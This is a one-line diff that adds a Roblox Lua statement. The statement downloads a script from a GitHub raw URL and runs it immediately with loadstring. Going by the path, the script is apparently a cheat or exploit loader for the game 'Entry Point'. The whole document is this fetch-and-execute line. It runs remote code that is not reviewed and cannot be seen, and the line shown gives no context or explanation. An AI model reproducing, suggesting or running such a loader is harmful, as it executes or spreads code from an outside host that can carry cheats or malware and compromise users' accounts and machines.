@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HarmonicPigeonExalt/loaders/main/loaders/entry-point-freelancer-s-cut-spam7-od3hkxs5o8bicy.lua"))()
